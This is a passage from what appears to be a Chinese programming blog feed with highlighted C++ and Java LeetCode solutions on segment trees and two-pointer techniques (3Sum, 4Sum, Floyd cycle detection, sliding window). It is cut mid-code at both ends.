class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(left==right)</span><br><span class="line">            <span class="keyword">return</span> left;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> mid=left+(right-left)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(minPeople[<span class="number">2</span>*o<span class="number">+1</span>]&lt;=val)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">index</span>(<span class="number">2</span>*o<span class="number">+1</span>,left,mid,R,val);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(mid&lt;R)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">index</span>(<span class="number">2</span>*o<span class="number">+2</span>,mid<span class="number">+1</span>,right,R,val);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">gather</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> maxRow)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> i=<span class="built_in">index</span>(<span class="number">0</span>,<span class="number">0</span>,n<span class="number">-1</span>,maxRow,m-k);</span><br><span class="line">        <span class="keyword">if</span>(i==<span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> seats=<span class="built_in">query_sum</span>(<span class="number">0</span>,<span class="number">0</span>,n<span class="number">-1</span>,i,i);</span><br><span class="line">        <span class="built_in">add</span>(<span class="number">0</span>,<span class="number">0</span>,n<span class="number">-1</span>,i,k);</span><br><span class="line">        <span class="keyword">return</span> &#123;i,seats&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">scatter</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> maxRow)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="type">long</span>)(maxRow<span class="number">+1</span>)*m-<span class="built_in">query_sum</span>(<span class="number">0</span>,<span class="number">0</span>,n<span class="number">-1</span>,<span class="number">0</span>,maxRow)&lt;k)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">// 找到第一个有空位置的排</span></span><br><span class="line">        <span class="type">int</span> i=<span class="built_in">index</span>(<span class="number">0</span>,<span class="number">0</span>,n<span class="number">-1</span>,maxRow,m<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="type">int</span> left_seats=m-<span class="built_in">query_sum</span>(<span class="number">0</span>,<span class="number">0</span>,n<span class="number">-1</span>,i,i);</span><br><span class="line">            <span class="keyword">if</span>(k&lt;=left_seats)&#123;</span><br><span class="line">                <span class="built_in">add</span>(<span class="number">0</span>,<span class="number">0</span>,n<span class="number">-1</span>,i,k);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            k-=left_seats;</span><br><span class="line">            <span class="built_in">add</span>(<span class="number">0</span>,<span class="number">0</span>,n<span class="number">-1</span>,i,left_seats);</span><br><span class="line">            i+=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your BookMyShow object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * BookMyShow* obj = new BookMyShow(n, m);</span></span><br><span class="line"><span class="comment"> * vector&lt;int&gt; param_1 = obj-&gt;gather(k,maxRow);</span></span><br><span class="line"><span class="comment"> * bool param_2 = obj-&gt;scatter(k,maxRow);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
<p>线段树区间合并法解决<strong>多次询问</strong>的「区间最长连续上升序列问题」和「区间最大子段和问题」</p>
<h4 id="53-最大子数组和"><a href="https://leetcode.cn/problems/maximum-subarray/">53. 最大子数组和</a></h4>
<blockquote>
<p>适用于大规模查询情况</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// lsum表示[l,r]内以l为左端点的最大子段和</span></span><br><span class="line">    <span class="comment">// rsum表示[l,r]内以r为右端点的最大子段和</span></span><br><span class="line">    <span class="comment">// msum表示[l,r]内的最大子段和</span></span><br><span class="line">    <span class="comment">// isum表示[l,r]的区间和</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Status</span>&#123;</span><br><span class="line">        <span class="type">int</span> lsum,rsum,msum,isum;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function">Status <span class="title">PushUp</span><span class="params">(Status l,Status r)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> isum=l.isum+r.isum;</span><br><span class="line">        <span class="type">int</span> lsum=<span class="built_in">max</span>(l.lsum,l.isum+r.lsum);</span><br><span class="line">        <span class="type">int</span> rsum=<span class="built_in">max</span>(r.rsum,l.rsum+r.isum);</span><br><span class="line">        <span class="type">int</span> msum=<span class="built_in">max</span>(<span class="built_in">max</span>(l.msum,r.msum),l.rsum+r.lsum);</span><br><span class="line">        <span class="keyword">return</span> Status&#123;lsum,rsum,msum,isum&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">Status <span class="title">get</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp;nums,<span class="type">int</span> left,<span class="type">int</span> right)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(left==right)</span><br><span class="line">            <span class="keyword">return</span> Status&#123;nums[left],nums[left],nums[left],nums[left]&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> mid=left+(right-left)/<span class="number">2</span>;</span><br><span class="line">        Status lsub=<span class="built_in">get</span>(nums,left,mid);</span><br><span class="line">        Status rsub=<span class="built_in">get</span>(nums,mid<span class="number">+1</span>,right);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">PushUp</span>(lsub,rsub);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxSubArray</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">get</span>(nums,<span class="number">0</span>,n<span class="number">-1</span>).msum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>动态开点线段树</p>
<h4 id="6899-达到末尾下标所需的最大跳跃次数"><a href="https://leetcode.cn/problems/maximum-number-of-jumps-to-reach-the-last-index/">6899. 达到末尾下标所需的最大跳跃次数</a></h4>
<h1>9 疑问</h1>
<h4 id="1851-包含每个查询的最小区间-2"><a href="https://leetcode.cn/problems/minimum-interval-to-include-each-query/">1851. 包含每个查询的最小区间</a></h4>
<blockquote>
<p>结构体中需要初始化指针为空，前面为什么不需要？代码哪里写的存在问题</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> N = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">        Node *left = <span class="literal">nullptr</span>, *right = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="type">int</span> val = INT_MAX;</span><br><span class="line">        <span class="type">int</span> lazy = <span class="number">0</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">minInterval</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;intervals,</span></span></span><br><span class="line"><span class="params"><span class="function">                            vector&lt;<span class="type">int</span>&gt; &amp;queries)</span> </span>&#123;</span><br><span class="line">        Node *root = <span class="keyword">new</span> Node;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;interval : intervals) &#123;</span><br><span class="line">            <span class="type">int</span> l = interval[<span class="number">0</span>], r = interval[<span class="number">1</span>];</span><br><span class="line">            <span class="built_in">update</span>(root, <span class="number">0</span>, N, l, r, r - l + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> n = queries.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">ans</span><span class="params">(n, <span class="number">-1</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> t = <span class="built_in">query</span>(root, <span class="number">0</span>, N, queries[i], queries[i]);</span><br><span class="line">            <span class="keyword">if</span> (t != INT_MAX)</span><br><span class="line">                ans[i] = t;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(Node *root, <span class="type">int</span> start, <span class="type">int</span> end, <span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l &lt;= start &amp;&amp; end &lt;= r) &#123;</span><br><span class="line">            root-&gt;val = <span class="built_in">min</span>(root-&gt;val, val);</span><br><span class="line">            root-&gt;lazy = root-&gt;val;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> mid = start + (end - start) / <span class="number">2</span>;</span><br><span class="line">        <span class="built_in">pushDown</span>(root);</span><br><span class="line">        <span class="keyword">if</span> (l &lt;= mid)</span><br><span class="line">            <span class="built_in">update</span>(root-&gt;left, start, mid, l, r, val);</span><br><span class="line">        <span class="keyword">if</span> (r &gt; mid)</span><br><span class="line">            <span class="built_in">update</span>(root-&gt;right, mid + <span class="number">1</span>, end, l, r, val);</span><br><span class="line">        root-&gt;val = <span class="built_in">min</span>(root-&gt;left-&gt;val, root-&gt;right-&gt;val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">pushDown</span><span class="params">(Node *root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!root-&gt;left)</span><br><span class="line">            root-&gt;left = <span class="keyword">new</span> <span class="built_in">Node</span>();</span><br><span class="line">        <span class="keyword">if</span> (!root-&gt;right)</span><br><span class="line">            root-&gt;right = <span class="keyword">new</span> <span class="built_in">Node</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (root-&gt;lazy == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        root-&gt;left-&gt;lazy = root-&gt;lazy;</span><br><span class="line">        root-&gt;right-&gt;lazy = root-&gt;lazy;</span><br><span class="line"></span><br><span class="line">        root-&gt;left-&gt;val = root-&gt;val;</span><br><span class="line">        root-&gt;right-&gt;val = root-&gt;val;</span><br><span class="line"></span><br><span class="line">        root-&gt;lazy = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(Node *root, <span class="type">int</span> start, <span class="type">int</span> end, <span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l &lt;= start &amp;&amp; end &lt;= r) &#123;</span><br><span class="line">            <span class="keyword">return</span> root-&gt;val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> mid = start + (end - start) / <span class="number">2</span>;</span><br><span class="line">        <span class="built_in">pushDown</span>(root);</span><br><span class="line">        <span class="type">int</span> ans = INT_MAX;</span><br><span class="line">        <span class="keyword">if</span> (l &lt;= mid)</span><br><span class="line">            ans = <span class="built_in">min</span>(ans, <span class="built_in">query</span>(root-&gt;left, start, mid, l, r));</span><br><span class="line">        <span class="keyword">if</span> (r &gt; mid)</span><br><span class="line">            ans = <span class="built_in">min</span>(ans, <span class="built_in">query</span>(root-&gt;right, mid + <span class="number">1</span>, end, l, r));</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/05/09/%E7%AE%97%E6%B3%95/%E5%8F%8C%E6%8C%87%E9%92%88/</url>
    <content><![CDATA[<h1>双指针</h1>
<h1>区间指针</h1>
<h2 id="分组循环">分组循环</h2>
<blockquote>
<p>查找符合条件的区间，寻找左右边界</p>
</blockquote>
<h4 id="2765-最长交替子序列"><a href="https://leetcode.cn/problems/longest-alternating-subarray/">2765. 最长交替子序列</a></h4>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">alternatingSubarray</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;  </span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="comment">// 分组循环，外层循环枚举起点，内层循环扩展右侧边界</span></span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> ans=<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;n<span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i<span class="number">+1</span>]-nums[i]!=<span class="number">1</span>)&#123;</span><br><span class="line">                i++;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> left=i; <span class="comment">//记录左端点</span></span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">while</span>(i&lt;n&amp;&amp;nums[i]==nums[left+(i-left)%<span class="number">2</span>])</span><br><span class="line">                i++;</span><br><span class="line">            ans=<span class="built_in">max</span>(ans,i-left);</span><br><span class="line">            i--;        <span class="comment">//回退到上一个区间最后一个位置</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="6900-统计完全子数组的数目"><a href="https://leetcode.cn/problems/count-complete-subarrays-in-an-array/">6900. 统计完全子数组的数目</a></h4>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countCompleteSubarrays</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="function">unordered_set&lt;<span class="type">int</span>&gt; <span class="title">record</span><span class="params">(nums.begin(),nums.end())</span></span>;</span><br><span class="line">        <span class="type">int</span> m=record.<span class="built_in">size</span>();</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>,<span class="type">int</span>&gt; cnt;        <span class="comment">//记录每个数字出现的个数</span></span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span> left=<span class="number">0</span>,ans=<span class="number">0</span>,n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="comment">//枚举右端点</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> right=<span class="number">0</span>;right&lt;n;right++)&#123;</span><br><span class="line">            cnt[nums[right]]++;</span><br><span class="line">            <span class="keyword">while</span>(cnt.<span class="built_in">size</span>()==m)&#123;</span><br><span class="line">                <span class="type">int</span> x=nums[left++];</span><br><span class="line">                <span class="keyword">if</span>(--cnt[x]==<span class="number">0</span>)</span><br><span class="line">                    cnt.<span class="built_in">erase</span>(x);</span><br><span class="line">            &#125;</span><br><span class="line">            ans+=left;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1>快慢指针</h1>
<h2 id="floyd判圈">floyd判圈</h2>
<p><a href="https://leetcode.cn/problems/palindrome-linked-list/">234. 回文链表</a></p>
<img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112241057961.png" alt="image-20211224105728916" style="zoom: 50%;" />
<p><img src="https://raw.githubusercontent.com/destiny0118/picgo/master/pic/202112241135413.png" alt="image-20211224113536339"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>从链表第一个节点开始<br>
$$<br>
\begin{aligned}<br>
r为环的长度，n为圈数 \<br>
2(a+x-1)=(a-1)+n\times r+x \<br>
a=n\times r -x+1<br>
\end{aligned}<br>
$$</p>
</li>
<li class="lvl-2">
<p>从头节点（不存储数据）开始<br>
$$<br>
\begin{aligned}<br>
r为环的长度，n为圈数 \<br>
2(a+x)=a+n\times r+x \<br>
a=n\times r -x<br>
\end{aligned}<br>
$$</p>
<p>slow，fast初始时指向同一个位置，而终止条件也是指向同一个位置，因此采用do—while循环比较好</p>
<p>fast遇到null停止，将判断相遇放到循环里</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">detectCycle</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span> || head.next == <span class="literal">null</span> ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="comment">// 找到相遇点z （对应上图）</span></span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(fast == <span class="literal">null</span> || fast.next == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            <span class="keyword">if</span> (fast == slow) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 想到 cycle起点y （对应上图）</span></span><br><span class="line">        slow = head;</span><br><span class="line">        <span class="keyword">while</span>(fast != slow) &#123;</span><br><span class="line">            fast = fast.next;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fast;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h1>滑动窗口</h1>
<blockquote>
<p>窗口大小固定</p>
</blockquote>
<p>滑动窗口，可以用来解决一些查找满足一定条件的连续区间的性质（长度等）的问题。由于区间连续，因此当区间发生变化时，可以通过旧有的计算结果对搜索空间进行剪枝，这样便减少了重复计算，降低了时间复杂度。往往类似于“请找到满足xx的最x的区间（子串、子数组）的xx”这类问题都可以使用该方法进行解决。</p>
<p>一般滑动窗口维护两个指针，左指针和右指针。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>当窗口内的元素未达到题目条件时，右指针右移，探索未知的区间来满足条件</p>
</li>
<li class="lvl-2">
<p>当窗口内的元素达到题目条件时，左指针右移，压缩区间，使窗口尽可能短得满足题目条件</p>
</li>
</ul>
<h1>首尾指针</h1>
<blockquote>
<p>指针分别指向首位置和尾位置，向中间移动</p>
</blockquote>
<h4 id="15-三数之和"><a href="https://leetcode.cn/problems/3sum/">15. 三数之和</a></h4>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">threeSum</span>(vector&lt;<span class="type">int</span>&gt; &amp;nums) &#123;</span><br><span class="line">    <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; ans;</span><br><span class="line">    <span class="type">int</span> m, n;</span><br><span class="line">    <span class="comment">//考虑空数组情况，这里i&lt;nums.size()-2为实际范围，这样写不用判断数组大小是否符合</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; nums[i] == nums[i - <span class="number">1</span>])</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        m = i + <span class="number">1</span>;</span><br><span class="line">        n = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (; m &lt; nums.<span class="built_in">size</span>(); m++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (m &gt; i + <span class="number">1</span> &amp;&amp; nums[m] == nums[m - <span class="number">1</span>])</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="comment">//寻找第三个元素</span></span><br><span class="line">            <span class="keyword">while</span> (m &lt; n &amp;&amp; nums[i] + nums[m] + nums[n] &gt; <span class="number">0</span>)</span><br><span class="line">                n--;</span><br><span class="line">            <span class="comment">//比较巧妙的情况，当m==n时，说明三个数相加还是大于0的，因为已经排好序，继续向后寻找第二个数还是会大于0</span></span><br><span class="line">            <span class="keyword">if</span> (m == n)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] + nums[m] + nums[n] == <span class="number">0</span>)</span><br><span class="line">                ans.<span class="built_in">push_back</span>(vector&lt;<span class="type">int</span>&gt;&#123;nums[i], nums[m], nums[n]&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">threeSum</span>(vector&lt;<span class="type">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>());</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; ans;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-2</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i&gt;<span class="number">0</span>&amp;&amp;nums[i]==nums[i<span class="number">-1</span>])</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="type">int</span> left=i<span class="number">+1</span>,right=n<span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">while</span>(left&lt;right)&#123;</span><br><span class="line">                <span class="keyword">while</span>(left&lt;right&amp;&amp;left&gt;i<span class="number">+1</span>&amp;&amp;nums[left]==nums[left<span class="number">-1</span>])</span><br><span class="line">                    left++;</span><br><span class="line">                <span class="keyword">if</span>(left==right)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                </span><br><span class="line">                <span class="type">int</span> sum=nums[i]+nums[left]+nums[right];</span><br><span class="line">                <span class="keyword">if</span>(sum&lt;<span class="number">0</span>)</span><br><span class="line">                    left++;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(sum&gt;<span class="number">0</span>)</span><br><span class="line">                    right--;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    ans.<span class="built_in">push_back</span>(&#123;nums[i],nums[left],nums[right]&#125;);</span><br><span class="line">                    left++;</span><br><span class="line">                    right--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="16-最接近的三数之和"><a href="https://leetcode.cn/problems/3sum-closest/">16. 最接近的三数之和</a></h4>
<blockquote>
<p>使用while循环和标记跳过重复元素</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">threeSumClosest</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> ans = nums[<span class="number">0</span>] + nums[<span class="number">1</span>] + nums[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="comment">// 跳过相同元素</span></span><br><span class="line">            <span class="keyword">if</span>(i&gt;<span class="number">0</span>&amp;&amp;nums[i]==nums[i<span class="number">-1</span>])</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> left = i + <span class="number">1</span>, right = n - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>(left&lt;right)&#123;</span><br><span class="line">                <span class="type">int</span> tmp = nums[i] + nums[left] + nums[right];</span><br><span class="line">                <span class="keyword">if</span>(tmp==target) <span class="keyword">return</span> target;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">abs</span>(target-tmp)&lt;<span class="built_in">abs</span>(target-ans)) ans=tmp;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(tmp&lt;target)&#123;</span><br><span class="line">                    <span class="type">int</span> j=left<span class="number">+1</span>;</span><br><span class="line">                    <span class="keyword">while</span>(j&lt;right&amp;&amp;nums[j]==nums[left])</span><br><span class="line">                        j++;</span><br><span class="line">                    left=j;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="type">int</span> k=right<span class="number">-1</span>;</span><br><span class="line">                    <span class="keyword">while</span>(left&lt;k&amp;&amp;nums[k]==nums[right])</span><br><span class="line">                        k--;</span><br><span class="line">                    right=k; </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="18-四数之和"><a href="https://leetcode.cn/problems/4sum/">18. 四数之和</a></h4>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; ans;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">fourSum</span>(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i&gt;<span class="number">0</span>&amp;&amp;nums[i]==nums[i<span class="number">-1</span>]) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=i<span class="number">+1</span>;j&lt;n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(j&gt;i<span class="number">+1</span>&amp;&amp;nums[j]==nums[j<span class="number">-1</span>])   <span class="keyword">continue</span>;</span><br><span class="line">                <span class="type">long</span> cur=nums[i]+nums[j];</span><br><span class="line">                <span class="comment">// 双指针</span></span><br><span class="line">                <span class="type">int</span> left=j<span class="number">+1</span>,right=n<span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">for</span>(;left&lt;n;left++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(left&gt;j<span class="number">+1</span>&amp;&amp;nums[left]==nums[left<span class="number">-1</span>])</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    <span class="keyword">while</span>(left&lt;right&amp;&amp;cur+nums[left]+nums[right]&gt;target)</span><br><span class="line">                        right--;</span><br><span class="line">                    <span class="keyword">if</span>(left==right)</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">if</span>(cur+nums[left]+nums[right]==target)&#123;</span><br><span class="line">                        ans.<span 